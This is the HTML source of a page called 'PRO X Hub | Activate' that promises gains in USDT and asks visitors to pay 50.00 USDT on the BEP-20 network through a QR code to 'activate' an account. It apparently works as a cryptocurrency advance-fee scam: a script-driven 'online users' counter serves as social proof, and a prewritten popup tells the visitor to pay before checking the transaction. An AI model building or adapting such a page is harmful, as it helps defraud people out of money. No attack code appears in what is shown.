<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="theme-color" content="#e0800b" />
    <link rel="icon" type="image/x-icon" href="assets/icon.png">
    <title>PRO X Hub | Activate</title>

    <!-- MS Tile - for Microsoft apps-->
    <meta name="PRO X Hub | Activate" content="assets/icon.png">

    <!-- fb & Whatsapp -->
    <!-- Site Name, Title, and Description to be displayed -->
    <meta property="og:site_name" content="PRO X Hub">
    <meta property="og:title" content="PRO X Hub | Activate">
    <meta property="og:description" content="The best hub to gain USDT!">
    <!-- Image to display -->
    <meta property="og:image" content="assets/icon.png">
    <!-- No need to change anything here -->
    <meta property="og:type" content="website" />
    <meta property="og:image:type" content="image/jpeg">
    <!-- Size of image. Any size up to 300. Anything above 300px will not work in WhatsApp -->
    <meta property="og:image:width" content="300">
    <meta property="og:image:height" content="300">
    <!-- Website to visit when clicked in fb or WhatsApp-->
    <meta property="og:url" content="https://proxhub.github.io/">

    <link rel="stylesheet" href="style.css">
</head>

<body onload="hideLoader()">
    <div class="loader-container">
        <div class="loader"></div>
    </div>

    <div class="users">
        <div class="green-point"></div>
        <p><span id="userCount"></span> online users.</p>
    </div>

    <div class="main">
        <p id="ip_message"></p>
        <hr>
        <br>
        <p>To activate your account, please pay 50.00 USDT via the provided QR code on the BEP-20 network.</p>
        <br>
        <img src="assets/QR-code.png">
        <br>
        <br>

        <button id="Btn">Check Transaction</button>
        <!-- The loading spinner -->
        <div id="loader2" class="loader2"></div>
        <!-- The popup message -->
        <div id="popup" class="popup">
            <span class="popup-close">&times;</span>
            <p>Error: Please pay 50.00 USDT before checking the transaction.</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
